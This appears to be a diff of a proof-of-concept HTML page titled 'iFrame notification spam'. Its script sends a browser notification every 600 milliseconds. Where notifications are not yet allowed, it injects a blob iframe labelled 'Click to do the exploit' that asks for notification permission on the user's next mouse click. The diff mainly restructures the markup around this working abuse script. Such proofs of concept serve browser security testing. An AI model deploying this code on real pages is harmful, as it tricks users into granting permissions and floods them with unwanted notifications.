@@ -1,6 +1,12 @@
 <!DOCTYPE html>
-<html>
-  <script>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="same-origin">
+    <title>iFrame notification spam</title>
+  </head>
+  <body>
+    <script>
     window.setInterval(function(){
       try{
         new Notification("Spam")
@@ -9,7 +15,7 @@
         }
       }
       catch(err){
-      var b = new Blob(["Click to do the exploit <script" + ">" + "window.onmousedown = function(){Notification.requestPermission()}" + "</script" + ">"],{type:"text/html"})
+      var b = new Blob(["Click to do the exploit <script" + ">" + "window.onmousedown = function(){Notification.requestPermission()}" + "<"+"/script" + ">"],{type:"text/html"})
       var i = document.createElement("iframe")
       i.onload = function(){
           var el= this
@@ -22,4 +28,6 @@
     },600)
   </script>
   Notification spam
+  </body>
+  
 </html>
